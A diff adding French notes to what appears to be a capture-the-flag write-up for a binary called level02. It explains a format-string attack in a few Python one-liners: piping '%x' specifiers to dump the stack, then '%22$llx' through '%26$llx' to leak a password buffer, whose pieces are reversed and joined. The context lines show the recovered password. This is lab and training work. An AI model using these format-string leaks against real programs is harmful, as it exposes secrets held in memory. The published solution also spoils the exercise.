@@ -45,3 +45,20 @@ EAJ5as9Q \= Q9sa5JAE
 H3gPfK9M \= M9KfPg3H
 
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+
+
+ou bien
+
+
+grace a la commande
+(python -c 'print "AAAA" + " %x"*30 + "\npassword"') | ./level02
+on peut observer ce qu'il y a dans la stack.
+en lisant le code en c, on voit que le buffer du password est juste au dessus
+de notre buffer de username dans la stack. il suffit donc de l'afficher avec
+(python -c 'print "%22$llx" + "\ndwqdwqdq"') | ./level02
+(python -c 'print "%23$llx" + "\ndwqdwqdq"') | ./level02
+(python -c 'print "%24$llx" + "\ndwqdwqdq"') | ./level02
+(python -c 'print "%25$llx" + "\ndwqdwqdq"') | ./level02
+(python -c 'print "%26$llx" + "\ndwqdwqdq"') | ./level02
+et de renverser chaque chaine puis de les assembler.
